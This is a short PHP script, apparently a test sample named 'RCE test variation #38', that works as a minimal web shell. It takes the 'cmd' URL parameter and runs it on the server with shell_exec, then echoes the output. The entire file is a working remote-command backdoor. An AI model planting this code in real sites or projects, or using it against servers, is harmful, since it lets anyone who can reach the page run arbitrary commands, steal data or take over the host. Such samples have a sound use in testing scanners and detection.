<?php
// RCE test variation #38
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>